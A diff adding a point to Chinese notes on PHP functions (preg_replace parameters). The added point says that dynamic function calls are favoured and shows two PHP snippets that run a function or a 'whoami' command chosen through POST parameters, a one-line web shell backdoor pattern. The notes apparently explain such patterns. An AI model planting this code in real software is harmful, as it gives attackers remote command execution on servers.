@@ -25,3 +25,13 @@ $replacement：用于替换的字符串或字符串数组。
 $subject：要搜索替换的目标字符串或字符串数组。
 $limit（可选）：每个模式对每个 subject 字符串的最大可替换次数，默认 -1（无限制）。
 $count（可选）：记录替换执行的次数。
+
+6，喜欢用动态函数，eg;
+$a=$_POST['data'];
+$b=$_POST['payload'];
+$a($b);
+或者干脆
+$a=$_POST['payload'];
+$$a('whoami');
+
+
